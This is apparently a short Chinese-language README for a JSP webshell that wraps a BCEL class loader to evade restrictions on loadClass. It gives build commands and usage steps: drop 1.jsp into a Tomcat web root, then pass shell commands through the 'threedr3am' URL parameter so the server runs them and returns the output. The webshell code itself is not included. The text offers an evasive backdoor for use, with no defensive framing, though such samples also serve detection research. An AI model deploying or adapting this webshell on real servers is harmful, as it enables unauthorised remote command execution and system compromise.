### BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP Webshell

生成BCEL字节码：
```
javac Threedr3am_15.class Threedr3am_make.class
java Threedr3am_make
```

使用：
```
1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问1.jsp，并使用参数threedr3am传入需要远程执行的命令，例：http://127.0.0.1:8080/1.jsp?threedr3am=whoami

3.服务器将会执行相应的shell命令，最后回显
```